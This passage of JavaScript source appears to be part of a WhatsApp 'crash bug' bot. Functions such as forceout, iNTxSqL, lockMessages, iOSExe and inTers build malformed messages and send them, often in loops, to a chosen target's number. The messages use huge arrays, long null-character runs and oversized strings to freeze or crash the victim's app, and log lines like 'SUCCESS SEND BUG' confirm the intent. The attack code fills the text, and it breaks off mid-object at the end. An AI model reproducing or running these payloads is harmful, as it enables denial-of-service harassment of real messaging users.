            nativeFlowResponseMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            },
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 1999 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ]
            },
            viewOnceMessage: {
              message: {
                text: "\u0000".repeat(50000)
              }
            }
          }
        }
      }
    }, {});

    console.log("✅ LURUS G MOKAD BY HANZ SENT!");
  } catch (e) {
    console.log("❌ ERROR: MAK LU SINI NGEWE", e.message);
  }
}
/*
async function iosXvLocX(sock, target) {
  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: Infinity,
            degreesLongitude: -Infinity,
            jpegThumbnail: null,
            name: "鈥硷笍 .r4LdzHeLL 鈥硷笍" + "饝噦饝喌饝喆饝喛饝喛".repeat(15000),
            url: `https://crash-ios.${"饝噦饝喌饝喆饝喛".repeat(15000)}.com/${"饝噦饝喌饝喆饝喛".repeat(15000)}.html/`,
            contextInfo: {
              urlTrackingMap: {
                urlTrackingMapElements: Array.from(
                  { length: 200900 },
                  (_, r4LdzHeLL) => ({ type: 1 })
                )
              }
            }
          },
        },
      },
    },
    {}
  );

  for (let i = 0; i < 5; i++) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined,
                },
              ],
            },
          ],
        },
      ],
    });
  };
  await sleep(1000)
}*/
async function forceout(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(
      target,
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(16),
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              contextInfo: {
                paticipant: target,
                remoteJid: "0@s.whatsappp.net",
                isForwarded: true,
                forwardingScore: 9999,
                mentionedJid: Array.from({ length: 1000 }, (_, r4) => `628${666 + r4}@s.whatsapp.net`),
                fromMe: true,
                forwardedAiBotMessageInfo: {
                  botJid: "13135550202@bot",
                  botName: "Meta AI",
                  creator: "Meta"
                },
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 200900 }, (_, z) => ({
                  type: 1
                }))
              },
              body: {
                text: "X",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "\u0000".repeat(15000),
                version: 3
              }
            }
          }
        }
      }, 
      { userJid: target }
    );
    
    await sock.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: { status_setting: "contacts" },
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
}
async function ofmSqLite(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast",
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
              },
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              body: {
                text: "\x10\x10\x10" + ".r4LdzHeaven ∞ 7eppeli.pdf",
                format: "DEFAULT"
              },
              nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "{ \"X\": { \"status\": \"\0\" } }",
                version: 3
              },
              contextInfo: {
                participant: sock.user.id,
                remoteJid: "\0",
                fromMe: true,
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 200666 }, 
                  (_, R4) => ({ 
                    participant: `628${R4 + 666}@s.whatsapp.net`, 
                    type: 1
                  })
                ),
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    )
  }
  await sleep(1000)
}
async function iNTxSqL(sock, target) {
  let invalidJid = "@RaldzzXyz $$$ @voidp $$$ @rraldz";
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: "\x10.r4LdzHeaven 👁‍🗨",
            format: "EXTENSIONS_1"
          },
          nativeFlowResponseMessage: {
            name: (["address_message","call_permission_request"][(i + (Math.random() < 0.5 ? 1 : 0)) % 2]),
            paramsJson: "{".repeat(1),
            version: 3
          },
          contextInfo: {
            remoteJid: invalidJid,
            mentionedJid: invalidJid,
            parentGroupJid: invalidJid,
            businessMessageForwardInfo: {
              businessOwnerJid: invalidJid
            },
            quotedMessage: {
              conversation: {
                lidJid: invalidJid,
                pnJid: invalidJid,
                oldJid: invalidJid,
                newJid: invalidJid
              }
            },
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 200900 },
                (_, r4LdzHeLL) => ({ type: 1 })
              )
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  }
  await sleep(1000);
}

// pemanggilan

// recommended looping
async function inTers6(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage(
      "status@broadcast",
      {
        interactiveResponseMessage: {
          body: {
            text: "\x10t.me/RaldzzXyz",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "{",
            version: 3
          },
          contextInfo: {
            remoteJid: " @RaldzzXyz $$$ @voidp $$ @rraldz ",
            urlTrackingMap: {
              urlTrackingMapElements: Array.from(
                { length: 900000 },
                () => ({ type: 1 })
              )
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    );
  };
  await sleep(1000)
}

// recommended looping
async function OnlyQuotaZ(sock, target) {
  try {
    let msg = await generateWAMessageFromContent(target, {
      interactiveMessage: {
        header: {
          hasMediaAttachment: true,
          videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc?ccb=11-4",
      mimetype: "video/mp4",
      fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
      fileLength: "289511",
      seconds: 9999,
      mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
      caption: "X",
      height: 9999,
      width: 620,
      fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
      directPath:
        "/v/t62.7161-24/13158969_599169879950168_4005798415047356713_n.enc",
      mediaKeyTimestamp: "1755695348"
          }
        },
        body: { text: "!" },
        contextInfo: {
            mentionedJid: [
                   "0@s.whatsapp.net",
                      ...Array.from(
                      { length: 1900 },
                      () => 
                      "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                       )
                   ]
                },
              nativeFlowMessage: {
                buttons: [
                {
                  name: "galaxy_message",
                  paramsJson: "\u0000".repeat(3000)
                }
             ]
          }
        }
      }, {});
      
    await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
  {
    participant: { jid: target },
    messageId: msg.key.id
  });
  
  let Message = await generateWAMessageFromContent(target, {
    stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
        mimetype: "image/webp",
        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
        fileLength: 999,
        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
         mediaKeyTimestamp: Math.floor(Date.now() / 999),
         isAnimated: true,
         isAvatar: null,
         isAiSticker: true,
         isLottie: false,
         height: 512,
         width: 512,
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: target,
            externalAdReply: {},
            quotedMessage: {
              ImageMessage: {
               url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: Buffer.from("CrP44RkJbl+shQQxxlJ6s0SAAcOWqWgxw3iEiGi3zZI=", "base64"),
            fileLength: "59668",
            height: 736,
            width: 736,
            mediaKey: Buffer.from("YRUaXE2466bqWOmhGwPxA6bC3Qif2tTFmsJ/Q+49ijc=", "base64"),
            fileEncSha256: Buffer.from("rTAiyS+goq3w37k70/mwSiCVRUFjD66uanaabunAG8w=", "base64"),
            directPath: "/o1/v/t24/f2/m269/AQO8fP6AIG1EcRNZZeBhFHdFgya8amkM1RUkSkPuUqRnE6cpnmqQ8oJXJof_8XkOdzuXXwfDTSbHUnyT0fxQiElWsTJhBxzMz2LrYQqS4Q?ccb=9-4&oh=01_Q5Aa2AHm-OtLbKQy0rfnIKTfL0QsHqMpN_lMWdPwjUMhhLYMSw&oe=68AD3977&_nc_sid=e6ed6c",
            mediaKeyTimestamp: "1753601096",
            jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD...", "base64")
              }
            }
          }
        }
      }, {});
      
      await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: Message.message
    }
  },
  {
    participant: { jid: target },
    messageId: Message.key.id
  });
  } catch (err) {
    console.log(`SUCCESS SEND BUG: ${target}`);
  }
    };
    
async function lockMessages(sock, target) {
    const zephyrineMessages = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",

                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 9007199254740991,
                                mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                fileName: "\u0001",
                                fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1723855952",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: Buffer.alloc(0)
                            },

                            hasMediaAttachment: true
                        },

                        body: {
                            text: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩"
                        },

                        nativeFlowMessage: {
                            messageParamsJson: "{".repeat(10000),

                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{ title: "\r", rows: [] }]
                                    })
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "\u0010".repeat(2500)
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "payment_method",
                                    buttonParamsJson: "{}"
                                },
                                {
                                    name: "single_select",
                                    buttonParamsJson: JSON.stringify({
                                        title: "# ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆🎩",
                                        sections: [{
                                            title: "\"\r".repeat(99999),
                                            rows: []
                                        }]
                                    })
                                },
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        flow_action: "navigate",
                                        flow_action_payload: {
                                            screen: "WELCOME_SCREEN"
                                        },
                                        flow_cta: "\"\r".repeat(99999),
                                        flow_id: "1169834181134583",
                                        flow_message_version: "3",
                                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                                    })
                                },
                                {
                                    name: "mpm",
                                    buttonParamsJson: "{}"
                                }
                            ]
                        }
                    }
                }
            }
        },
        {
            userJid: target,
            quoted: null
        }
    );

    await sock.relayMessage(
        target,
        zephyrineMessages.message,
        {
            messageId: zephyrineMessages.key.id,
            participant: { jid: target },
            userJid: target
        }
    );
}

async function iNTofmSqL(sock, target) {
  for (let i = 0; i < 10; i++) {
    await sock.relayMessage("status@broadcast",
      {
        botInvokeMessage: {
          message: {
            messageContextInfo: {
              messageSecret: crypto.randomBytes(32),
              deviceListMetadata: {
                senderKeyIndex: 0,
                senderTimestamp: Date.now(),
                recipientKeyIndex: 0
              },
              deviceListMetadataVersion: 2
            },
            interactiveResponseMessage: {
              body: {
                text: ".r4LdzHeaven ∞ 7eppeli.pdf",
                format: "EXTENSIONS_1"
              },
              nativeFlowResponseMessage: {
                name: (
                  ["address_message", "call_permission_request", "galaxy_message"][(i + (Math.random() < 0.5 ? 1 : 0)) % 3]),
                paramsJson: "\u0000".repeat(1),
                version: 3
              },
              contextInfo: {
                participant: sock.user.id,
                remoteJid: "@RaldzzXyz ∞ @ZeppeliPdf",
                fromMe: true,
                statusAttributionType: 2,
                urlTrackingMap: {
                  urlTrackingMapElements: Array.from(
                    { length: 500000 },
                    () => ({ type: 1 })
                  )
                }
              }
            }
          }
        }
      },
      {
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: { status_setting: "allowlist" },
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target },
                    content: []
                  }
                ]
              }
            ]
          }
        ]
      }
    )
  }
  await sleep(1000)
}

// pemanggilan

async function iOSExe(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./hyuuXxsad" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./hyuuXxBukanDep" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "woi",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "maklo",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "ppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "pppp",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./diki" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

async function inviteUI(sock, target) {
await sock.relayMessage(target, {
"extendedTextMessage": {
"text": "DENIS SUKA MMK" + "ꦽ".repeat(50000),
"previewType": "NONE",
"contextInfo": {
"mentionedJid": [
target
]
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
}, {
participant: { jid: target }
});
}
async function xvsp(sock,target) {
  await sock.relayMessage("status@broadcast",
    {
      interactiveResponseMessage: {
        body: {
          text: "x",
          format: "DEFAULT"
        },
        nativeFlowResponseMessage: {
          name: "call_permission_request",
          paramsJson: "{",
          version: 3
        },
        contextInfo: {
          urlTrackingMap: {
            urlTrackingMapElements: Array.from(
              { length: 200900 },
              () => ({ type: 1 })
            )
          }
        }
      }
    },
    {
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: { status_setting: "allowlist" },
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: []
                }
              ]
            }
          ]
        }
      ]
    }
  );
}
async function PayLink(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: " ./R4LDZ EXE", 
          previewType: 6,
          contextInfo: {
            mentionedJid: Array.from({ length: 100 }, (_, z) => `628${z + 1}@s.whatsapp.net`)
          },
          paymentLinkMetadata: {
            button: {
              displayText: "Bro?"
            }, 
            header: {
              headerType: 2
            }, 
            provider: {
              paramsJson: "{".repeat(10000) 
            }
          }
        }
      }
    }
  }, {});
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target }
  }) 
}


async function inTers(sock, target) {
  try {
  const currentRepeatCount = 522500;  
  const msg1 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: ".menu", format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const msg2 = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: "x", format: "BOLD" },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: "\u0000".repeat(currentRepeatCount),
              version: 3
            },
            contextInfo: {
              entryPointConversionSource: "call_permission_request"
            }
          }
        }
      }
    }, {
      userJid: target,
      messageId: undefined,
      messageTimestamp: (Date.now() / 1000) | 0
    });

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key?.id || undefined,
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    }, { participant: target });

    const Audio = {
      message: {
        ephemeralMessage: {
          message: {
            audioMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
              mimetype: "audio/mpeg",
              fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
              fileLength: 999999999999,
              seconds: 99999999999999,
              ptt: true,
              mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
              fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
              directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
              mediaKeyTimestamp: 99999999999999,
              contextInfo: {
                mentionedJid: [
                  "@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 90000000) + "@s.whatsapp.net")
                ],
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: "133@newsletter",
                  serverMessageId: 1,
                  newsletterName: "𞋯"
                }
              },
              waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
            }
          }
        }
      }
    };

    const msgAudio = await generateWAMessageFromContent(target, Audio.message, { userJid: target });

    await sock.relayMessage("status@broadcast", msgAudio.message, {
      messageId: msgAudio.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    const stickerMsg = {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
        fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
        mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
        mimetype: "image/webp",
        height: 9999,
        width: 9999,
        directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
        fileLength: 12260,
        mediaKeyTimestamp: "1743832131",
        isAnimated: false,
        stickerSentTs: "X",
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
          ],
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    };

    await sock.relayMessage("status@broadcast", stickerMsg, {
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target } }]
        }]
      }]
    });

    if (mention) {
      await sock.relayMessage(target, {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msgAudio.key,
              type: 25
            }
          }
        }
      }, {
        additionalNodes: [{
          tag: "meta",
          attrs: {
            is_status_mention: "!"
          },
          content: undefined
        }]
      });
    }
    let msg = await generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        body : { text: "X", format: "DEFAULT" },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: "\u0000".repeat(100000)
        },
    contextInfo: {
       mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 3000 },
                () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              )
            ],
       entryPointConversionSource: "galaxy_message"
      }
    }
  }, {});
  
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: msg.message
    }
  },
    {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
  } catch (err) {
    console.log(err.message)
  }
}

async function D3nss(sock, target) {
  const StanzaSock = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
